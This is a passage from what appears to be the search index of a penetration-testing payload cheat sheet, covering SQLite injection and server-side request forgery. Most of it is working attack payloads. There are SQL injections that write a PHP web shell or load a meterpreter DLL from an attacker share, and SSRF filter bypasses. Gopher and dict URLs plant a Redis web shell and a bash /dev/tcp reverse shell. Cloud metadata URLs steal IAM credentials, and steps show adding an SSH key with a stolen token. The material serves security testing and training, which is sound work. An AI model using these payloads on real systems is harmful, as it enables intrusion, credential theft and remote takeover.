'sqlite_%' ) &lt; number_of_table\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#boolean-enumerating-table-name","title":"Boolean - Enumerating table name","text":"<pre><code>and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#boolean-extract-info","title":"Boolean - Extract info","text":"<pre><code>and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &gt; hex('some_char')\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#boolean-extract-info-order-by","title":"Boolean - Extract info (order by)","text":"<pre><code>CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN &lt;order_element_1&gt; ELSE &lt;order_element_2&gt; END\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#boolean-error-based","title":"Boolean - Error based","text":"<pre><code>AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#time-based","title":"Time based","text":"<pre><code>AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#remote-command-execution-using-sqlite-command-attach-database","title":"Remote Command Execution using SQLite command - Attach Database","text":"<pre><code>ATTACH DATABASE '/var/www/lol.php' AS lol;\nCREATE TABLE lol.pwn (dataz text);\nINSERT INTO lol.pwn (dataz) VALUES (\"&lt;?php system($_GET['cmd']); ?&gt;\");--\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#remote-command-execution-using-sqlite-command-load_extension","title":"Remote Command Execution using SQLite command - Load_extension","text":"<pre><code>UNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');--\n</code></pre> <p>Note: By default this component is disabled</p>"},{"location":"SQL%20Injection/SQLite%20Injection/#references","title":"References","text":"<p>Injecting SQLite database based application - Manish Kishan Tanwar SQLite Error Based Injection for Enumeration</p>"},{"location":"Server%20Side%20Request%20Forgery/","title":"Server-Side Request Forgery","text":"<p>Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.</p>"},{"location":"Server%20Side%20Request%20Forgery/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Payloads with localhost</li> <li>Bypassing filters</li> <li>Bypass using HTTPS</li> <li>Bypass localhost with [::]</li> <li>Bypass localhost with a domain redirection</li> <li>Bypass localhost with CIDR</li> <li>Bypass using a decimal IP location</li> <li>Bypass using octal IP</li> <li>Bypass using IPv6/IPv4 Address Embedding</li> <li>Bypass using malformed urls</li> <li>Bypass using rare address</li> <li>Bypass using URL encoding</li> <li>Bypass using bash variables</li> <li>Bypass using tricks combination</li> <li>Bypass using enclosed alphanumerics</li> <li>Bypass filter_var() php function</li> <li>Bypass against a weak parser</li> <li>Bypassing using jar protocol (java only)</li> <li>SSRF exploitation via URL Scheme</li> <li>file://</li> <li>http://</li> <li>dict://</li> <li>sftp://</li> <li>tftp://</li> <li>ldap://</li> <li>gopher://</li> <li>netdoc://</li> <li>SSRF exploiting WSGI</li> <li>SSRF exploiting Redis</li> <li>SSRF exploiting PDF file</li> <li>Blind SSRF</li> <li>SSRF to XSS</li> <li>SSRF from XSS</li> <li>SSRF URL for Cloud Instances</li> <li>SSRF URL for AWS Bucket</li> <li>SSRF URL for AWS ECS</li> <li>SSRF URL for AWS Elastic Beanstalk</li> <li>SSRF URL for AWS Lambda</li> <li>SSRF URL for Google Cloud</li> <li>SSRF URL for Digital Ocean</li> <li>SSRF URL for Packetcloud</li> <li>SSRF URL for Azure</li> <li>SSRF URL for OpenStack/RackSpace</li> <li>SSRF URL for HP Helion</li> <li>SSRF URL for Oracle Cloud</li> <li>SSRF URL for Kubernetes ETCD</li> <li>SSRF URL for Alibaba</li> <li>SSRF URL for Docker</li> <li>SSRF URL for Rancher</li> </ul>"},{"location":"Server%20Side%20Request%20Forgery/#tools","title":"Tools","text":"<ul> <li>SSRFmap - https://github.com/swisskyrepo/SSRFmap</li> <li>Gopherus - https://github.com/tarunkant/Gopherus</li> <li>See-SURF - https://github.com/In3tinct/See-SURF</li> <li>SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff</li> </ul>"},{"location":"Server%20Side%20Request%20Forgery/#payloads-with-localhost","title":"Payloads with localhost","text":"<ul> <li>Using <code>localhost</code> <pre><code>http://localhost:80\nhttp://localhost:443\nhttp://localhost:22\n</code></pre></li> <li>Using <code>127.0.0.1</code> <pre><code>http://127.0.0.1:80\nhttp://127.0.0.1:443\nhttp://127.0.0.1:22\n</code></pre></li> <li>Using <code>0.0.0.0</code> <pre><code>http://0.0.0.0:80\nhttp://0.0.0.0:443\nhttp://0.0.0.0:22\n</code></pre></li> </ul>"},{"location":"Server%20Side%20Request%20Forgery/#bypassing-filters","title":"Bypassing filters","text":""},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-https","title":"Bypass using HTTPS","text":"<pre><code>https://127.0.0.1/\nhttps://localhost/\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-localhost-with","title":"Bypass localhost with [::]","text":"<pre><code>http://[::]:80/\nhttp://[::]:25/ SMTP\nhttp://[::]:22/ SSH\nhttp://[::]:3128/ Squid\n</code></pre> <pre><code>http://0000::1:80/\nhttp://0000::1:25/ SMTP\nhttp://0000::1:22/ SSH\nhttp://0000::1:3128/ Squid\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-localhost-with-a-domain-redirection","title":"Bypass localhost with a domain redirection","text":"<ul> <li><code>spoofed.[BURP_COLLABORATOR]</code> such as <code>spoofed.redacted.oastify.com</code></li> <li><code>localtest.me</code> redirect to <code>::1</code></li> <li><code>company.127.0.0.1.nip.io</code> redirect to <code>127.0.0.1</code></li> <li><code>bugbounty.dod.network</code> redirect to <code>127.0.0.2</code></li> </ul> <p>The service nip.io is awesome for that, it will convert any ip address as a dns.</p> <pre><code>NIP.IO maps &lt;anything&gt;.&lt;IP Address&gt;.nip.io to the corresponding &lt;IP Address&gt;, even 127.0.0.1.nip.io maps to 127.0.0.1\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-localhost-with-cidr","title":"Bypass localhost with CIDR","text":"<p>IP addresses from 127.0.0.0/8</p> <pre><code>http://127.127.127.127\nhttp://127.0.1.3\nhttp://127.0.0.0\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-a-decimal-ip-location","title":"Bypass using a decimal IP location","text":"<pre><code>http://2130706433/ = http://127.0.0.1\nhttp://3232235521/ = http://192.168.0.1\nhttp://3232235777/ = http://192.168.1.1\nhttp://2852039166/  = http://169.254.169.254\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-octal-ip","title":"Bypass using octal IP","text":"<p>Implementations differ on how to handle octal format of ipv4.</p> <pre><code>http://0177.0.0.1/ = http://127.0.0.1\nhttp://o177.0.0.1/ = http://127.0.0.1\nhttp://0o177.0.0.1/ = http://127.0.0.1\nhttp://q177.0.0.1/ = http://127.0.0.1\n...\n</code></pre> <p>Ref:  - DEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards &amp; pwning IPv4 parsing - AppSecEU15-Server_side_browsing_considered_harmful.pdf</p>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-ipv6ipv4-address-embedding","title":"Bypass using IPv6/IPv4 Address Embedding","text":"<p>IPv6/IPv4 Address Embedding</p> <pre><code>http://[0:0:0:0:0:ffff:127.0.0.1]\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-malformed-urls","title":"Bypass using malformed urls","text":"<pre><code>localhost:+11211aaa\nlocalhost:00011211aaaa\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-rare-address","title":"Bypass using rare address","text":"<p>You can short-hand IP addresses by dropping the zeros</p> <pre><code>http://0/\nhttp://127.1\nhttp://127.0.1\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-url-encoding","title":"Bypass using URL encoding","text":"<p>Single or double encode a specific URL to bypass blacklist</p> <pre><code>http://127.0.0.1/%61dmin\nhttp://127.0.0.1/%2561dmin\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-bash-variables","title":"Bypass using bash variables","text":"<p>(curl only)</p> <pre><code>curl -v \"http://evil$google.com\"\n$google = \"\"\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-tricks-combination","title":"Bypass using tricks combination","text":"<pre><code>http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/\nurllib2 : 1.1.1.1\nrequests + browsers : 2.2.2.2\nurllib : 3.3.3.3\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-enclosed-alphanumerics","title":"Bypass using enclosed alphanumerics","text":"<p>@EdOverflow</p> <pre><code>http://\u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc = example.com\nList:\n\u2460 \u2461 \u2462 \u2463 \u2464 \u2465 \u2466 \u2467 \u2468 \u2469 \u246a \u246b \u246c \u246d \u246e \u246f \u2470 \u2471 \u2472 \u2473 \u2474 \u2475 \u2476 \u2477 \u2478 \u2479 \u247a \u247b \u247c \u247d \u247e \u247f \u2480 \u2481 \u2482 \u2483 \u2484 \u2485 \u2486 \u2487 \u2488 \u2489 \u248a \u248b \u248c \u248d \u248e \u248f \u2490 \u2491 \u2492 \u2493 \u2494 \u2495 \u2496 \u2497 \u2498 \u2499 \u249a \u249b \u249c \u249d \u249e \u249f \u24a0 \u24a1 \u24a2 \u24a3 \u24a4 \u24a5 \u24a6 \u24a7 \u24a8 \u24a9 \u24aa \u24ab \u24ac \u24ad \u24ae \u24af \u24b0 \u24b1 \u24b2 \u24b3 \u24b4 \u24b5 \u24b6 \u24b7 \u24b8 \u24b9 \u24ba \u24bb \u24bc \u24bd \u24be \u24bf \u24c0 \u24c1 \u24c2 \u24c3 \u24c4 \u24c5 \u24c6 \u24c7 \u24c8 \u24c9 \u24ca \u24cb \u24cc \u24cd \u24ce \u24cf \u24d0 \u24d1 \u24d2 \u24d3 \u24d4 \u24d5 \u24d6 \u24d7 \u24d8 \u24d9 \u24da \u24db \u24dc \u24dd \u24de \u24df \u24e0 \u24e1 \u24e2 \u24e3 \u24e4 \u24e5 \u24e6 \u24e7 \u24e8 \u24e9 \u24ea \u24eb \u24ec \u24ed \u24ee \u24ef \u24f0 \u24f1 \u24f2 \u24f3 \u24f4 \u24f5 \u24f6 \u24f7 \u24f8 \u24f9 \u24fa \u24fb \u24fc \u24fd \u24fe \u24ff\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-unicode","title":"Bypass using unicode","text":"<p>In some languages (.NET, Python 3) regex supports unicode by default. <code>\\d</code> includes <code>0123456789</code> but also <code>\u0e50\u0e51\u0e52\u0e53\u0e54\u0e55\u0e56\u0e57\u0e58\u0e59</code>.</p>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-filter_var-php-function","title":"Bypass filter_var() php function","text":"<pre><code>0://evil.com:80;http://google.com:80/ \n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypass-against-a-weak-parser","title":"Bypass against a weak parser","text":"<p>by Orange Tsai (Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)</p> <pre><code>http://127.1.1.1:80\\@127.2.2.2:80/\nhttp://127.1.1.1:80\\@@127.2.2.2:80/\nhttp://127.1.1.1:80:\\@@127.2.2.2:80/\nhttp://127.1.1.1:80#\\@127.2.2.2:80/\n</code></pre> <p></p>"},{"location":"Server%20Side%20Request%20Forgery/#bypassing-using-a-redirect","title":"Bypassing using a redirect","text":"<p>using a redirect</p> <pre><code>1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)\n2. Launch the SSRF pointing to  vulnerable.com/index.php?url=http://YOUR_SERVER_IP\nvulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1\n3. You can use response codes [307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection.\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypassing-using-typeurl","title":"Bypassing using type=url","text":"<pre><code>Change \"type=file\" to \"type=url\"\nPaste URL in text field and hit enter\nUsing this vulnerability users can upload images from any image URL = trigger an SSRF\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypassing-using-dns-rebinding-toctou","title":"Bypassing using DNS Rebinding (TOCTOU)","text":"<pre><code>Create a domain that change between two IPs. http://1u.ms/ exists for this purpose.\nFor example to rotate between 1.2.3.4 and 169.254-169.254, use the following domain:\nmake-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#bypassing-using-jar-protocol-java-only","title":"Bypassing using jar protocol (java only)","text":"<p>Blind SSRF</p> <pre><code>jar:scheme://domain/path!/ \njar:http://127.0.0.1!/\njar:https://127.0.0.1!/\njar:ftp://127.0.0.1!/\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-exploitation-via-url-scheme","title":"SSRF exploitation via URL Scheme","text":""},{"location":"Server%20Side%20Request%20Forgery/#file","title":"File","text":"<p>Allows an attacker to fetch the content of a file on the server</p> <pre><code>file://path/to/file\nfile:///etc/passwd\nfile://\\/\\/etc/passwd\nssrf.php?url=file:///etc/passwd\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#http","title":"HTTP","text":"<p>Allows an attacker to fetch any content from the web, it can also be used to scan ports.</p> <pre><code>ssrf.php?url=http://127.0.0.1:22\nssrf.php?url=http://127.0.0.1:80\nssrf.php?url=http://127.0.0.1:443\n</code></pre> <p></p> <p>The following URL scheme can be used to probe the network</p>"},{"location":"Server%20Side%20Request%20Forgery/#dict","title":"Dict","text":"<p>The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:</p> <pre><code>dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;\nssrf.php?url=dict://attacker:11111/\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#sftp","title":"SFTP","text":"<p>A network protocol used for secure file transfer over secure shell</p> <pre><code>ssrf.php?url=sftp://evil.com:11111/\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#tftp","title":"TFTP","text":"<p>Trivial File Transfer Protocol, works over UDP</p> <pre><code>ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ldap","title":"LDAP","text":"<p>Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.</p> <pre><code>ssrf.php?url=ldap://localhost:11211/%0astats%0aquit\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#gopher","title":"Gopher","text":"<pre><code>ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a\nwill make a request like\nHELO localhost\nMAIL FROM:&lt;hacker@site.com&gt;\nRCPT TO:&lt;victim@site.com&gt;\nDATA\nFrom: [Hacker] &lt;hacker@site.com&gt;\nTo: &lt;victime@site.com&gt;\nDate: Tue, 15 Sep 2017 17:20:26 -0400\nSubject: Ah Ah AH\nYou didn't say the magic word !\n.\nQUIT\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#gopher-http","title":"Gopher HTTP","text":"<pre><code>gopher://&lt;proxyserver&gt;:8080/_GET http://&lt;attacker:80&gt;/x HTTP/1.1%0A%0A\ngopher://&lt;proxyserver&gt;:8080/_POST%20http://&lt;attacker&gt;:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#gopher-smtp-back-connect-to-1337","title":"Gopher SMTP - Back connect to 1337","text":"<pre><code>Content of evil.com/redirect.php:\n&lt;?php\nheader(\"Location: gopher://hack3r.site:1337/_SSRF%0ATest!\");\n?&gt;\nNow query it.\nhttps://example.com/?q=http://evil.com/redirect.php.\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#gopher-smtp-send-a-mail","title":"Gopher SMTP - send a mail","text":"<pre><code>Content of evil.com/redirect.php:\n&lt;?php\n$commands = array(\n'HELO victim.com',\n'MAIL FROM: &lt;admin@victim.com&gt;',\n'RCPT To: &lt;sxcurity@oou.us&gt;',\n'DATA',\n'Subject: @sxcurity!',\n'Corben was here, woot woot!',\n'.'\n);\n$payload = implode('%0A', $commands);\nheader('Location: gopher://0:25/_'.$payload);\n?&gt;\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#netdoc","title":"Netdoc","text":"<p>Wrapper for Java when your payloads struggle with \"\\n\" and \"\\r\" characters.</p> <pre><code>ssrf.php?url=netdoc:///etc/passwd\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-exploiting-wsgi","title":"SSRF exploiting WSGI","text":"<p>Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py.</p> <pre><code>gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py\n</code></pre> Header modifier1 (1 byte) 0 (%00) datasize (2 bytes) 26 (%1A%00) modifier2 (1 byte) 0 (%00) Variable (UWSGI_FILE) key length (2 bytes) 10 (%0A%00) key data (m bytes) UWSGI_FILE value length (2 bytes) 12 (%0C%00) value data (n bytes) /tmp/test.py"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-exploiting-redis","title":"SSRF exploiting Redis","text":"<p>Redis is a database system that stores everything in RAM</p> <pre><code># Getting a webshell\nurl=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html\nurl=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php\nurl=dict://127.0.0.1:6379/SET%20mykey%20\"&lt;\\x3Fphp system($_GET[0])\\x3F&gt;\"\nurl=dict://127.0.0.1:6379/SAVE\n# Getting a PHP reverse shell\ngopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml\ngopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php\ngopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22\ngopher://127.0.0.1:6379/_save\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-exploiting-pdf-file","title":"SSRF exploiting PDF file","text":"<p>Example with WeasyPrint by @nahamsec</p> <pre><code>&lt;link rel=attachment href=\"file:///root/secret.txt\"&gt;\n</code></pre> <p>Example with PhantomJS </p> <pre><code>&lt;script&gt;\nexfil = new XMLHttpRequest();\nexfil.open(\"GET\",\"file:///etc/passwd\");\nexfil.send();\nexfil.onload = function(){document.write(this.responseText);}\nexfil.onerror = function(){document.write('failed!')}\n&lt;/script&gt;\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#blind-ssrf","title":"Blind SSRF","text":"<p>When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. </p> <p>Use an SSRF chain to gain an Out-of-Band output.</p> <p>From https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.com/assetnote/blind-ssrf-chains</p> <p>Possible via HTTP(s) - Elasticsearch - Weblogic - Hashicorp Consul - Shellshock - Apache Druid - Apache Solr - PeopleSoft - Apache Struts - JBoss - Confluence - Jira - Other Atlassian Products - OpenTSDB - Jenkins - Hystrix Dashboard - W3 Total Cache - Docker - Gitlab Prometheus Redis Exporter</p> <p>Possible via Gopher - Redis - Memcache - Apache Tomcat</p>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-to-xss","title":"SSRF to XSS","text":"<p>by @D0rkerDevil &amp; @alyssa.o.herrera</p> <pre><code>http://brutelogic.com.br/poc.svg -&gt; simple alert\nhttps://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -&gt; simple ssrf\n\nhttps://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-from-xss","title":"SSRF from XSS","text":""},{"location":"Server%20Side%20Request%20Forgery/#using-an-iframe","title":"Using an iframe","text":"<p>The content of the file will be integrated inside the PDF as an image or text.</p> <pre><code>&lt;img src=\"echopwn\" onerror=\"document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;')\"/&gt;\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#using-an-attachment","title":"Using an attachment","text":"<p>Example of a PDF attachment using HTML </p> <ol> <li>use <code>&lt;link rel=attachment href=\"URL\"&gt;</code> as Bio text</li> <li>use 'Download Data' feature to get PDF</li> <li>use <code>pdfdetach -saveall filename.pdf</code> to extract embedded resource</li> <li><code>cat attachment.bin</code></li> </ol>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-cloud-instances","title":"SSRF URL for Cloud Instances","text":""},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-aws-bucket","title":"SSRF URL for AWS Bucket","text":"<p>Docs Interesting path to look for at <code>http://169.254.169.254</code> or <code>http://instance-data</code></p> <pre><code>Always here : /latest/meta-data/{hostname,public-ipv4,...}\nUser data (startup script for auto-scaling) : /latest/user-data\nTemporary AWS credentials : /latest/meta-data/iam/security-credentials/\n</code></pre> <p>DNS record</p> <pre><code>http://instance-data\nhttp://169.254.169.254\nhttp://169.254.169.254.nip.io/\n</code></pre> <p>HTTP redirect</p> <pre><code>Static:http://nicob.net/redir6a\nDynamic:http://nicob.net/redir-http-169.254.169.254:80-\n</code></pre> <p>Alternate IP encoding</p> <pre><code>http://425.510.425.510/ Dotted decimal with overflow\nhttp://2852039166/ Dotless decimal\nhttp://7147006462/ Dotless decimal with overflow\nhttp://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal\nhttp://0xA9FEA9FE/ Dotless hexadecimal\nhttp://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow\nhttp://0251.0376.0251.0376/ Dotted octal\nhttp://0251.00376.000251.0000376/ Dotted octal with padding\nhttp://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)\n</code></pre> <p>More urls to include</p> <pre><code>http://169.254.169.254/latest/user-data\nhttp://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance\nhttp://169.254.169.254/latest/meta-data/ami-id\nhttp://169.254.169.254/latest/meta-data/reservation-id\nhttp://169.254.169.254/latest/meta-data/hostname\nhttp://169.254.169.254/latest/meta-data/public-keys/\nhttp://169.254.169.254/latest/meta-data/public-keys/0/openssh-key\nhttp://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/dummy\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/s3access\nhttp://169.254.169.254/latest/dynamic/instance-identity/document\n</code></pre> <p>AWS SSRF Bypasses <pre><code>Converted Decimal IP: http://2852039166/latest/meta-data/\nIPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/\nIPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/\nIPV6/IPV4: http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/\n</code></pre></p> <p>E.g: Jira SSRF leading to AWS info disclosure - <code>https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance</code></p> <p>E.g2: Flaws challenge - <code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/</code></p>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-aws-ecs","title":"SSRF URL for AWS ECS","text":"<p>If you have an SSRF with file system access on an ECS instance, try extracting <code>/proc/self/environ</code> to get UUID.</p> <pre><code>curl http://169.254.170.2/v2/credentials/&lt;UUID&gt;\n</code></pre> <p>This way you'll extract IAM keys of the attached role</p>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-aws-elastic-beanstalk","title":"SSRF URL for AWS Elastic Beanstalk","text":"<p>We retrieve the <code>accountId</code> and <code>region</code> from the API.</p> <pre><code>http://169.254.169.254/latest/dynamic/instance-identity/document\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role\n</code></pre> <p>We then retrieve the <code>AccessKeyId</code>, <code>SecretAccessKey</code>, and <code>Token</code> from the API.</p> <pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role\n</code></pre> <p></p> <p>Then we use the credentials with <code>aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/</code>.</p>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-aws-lambda","title":"SSRF URL for AWS Lambda","text":"<p>AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.</p> <pre><code>http://localhost:9001/2018-06-01/runtime/invocation/next\n$ curl \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\"\n</code></pre> <p>Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next</p>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-google-cloud","title":"SSRF URL for Google Cloud","text":"<p> Google is shutting down support for usage of the v1 metadata service on January 15.</p> <p>Requires the header \"Metadata-Flavor: Google\" or \"X-Google-Metadata-Request: True\"</p> <pre><code>http://169.254.169.254/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/\nhttp://metadata/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/hostname\nhttp://metadata.google.internal/computeMetadata/v1/instance/id\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id\n</code></pre> <p>Google allows recursive pulls</p> <pre><code>http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true\n</code></pre> <p>Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)</p> <pre><code>http://metadata.google.internal/computeMetadata/v1beta1/\nhttp://metadata.google.internal/computeMetadata/v1beta1/?recursive=true\n</code></pre> <p>Required headers can be set using a gopher SSRF with the following technique</p> <pre><code>gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a\n</code></pre> <p>Interesting files to pull out:</p> <ul> <li>SSH Public Key : <code>http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json</code></li> <li>Get Access Token : <code>http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</code></li> <li>Kubernetes Key : <code>http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json</code></li> </ul>"},{"location":"Server%20Side%20Request%20Forgery/#add-an-ssh-key","title":"Add an SSH key","text":"<p>Extract the token</p> <pre><code>http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json\n</code></pre> <p>Check the scope of the token</p> <pre><code>$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  \n{ \n\"issued_to\": \"101302079XXXXX\", \n\"audience\": \"10130207XXXXX\", \n\"scope\": \"https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring\", \n\"expires_in\": 2443, \n\"access_type\": \"offline\" \n}\n</code></pre> <p>Now push the SSH key.</p> <pre><code>curl -X POST \"https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\" \n-H \"Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA\" \n-H \"Content-Type: application/json\" \n--data '{\"items\": [{\"key\": \"sshkeyname\", \"value\": \"sshkeyvalue\"}]}'\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-digital-ocean","title":"SSRF URL for Digital Ocean","text":"<p>Documentation available at <code>https://developers.digitalocean.com/documentation/metadata/</code></p> <pre><code>curl http://169.254.169.254/metadata/v1/id\nhttp://169.254.169.254/metadata/v1.json\nhttp://169.254.169.254/metadata/v1/ 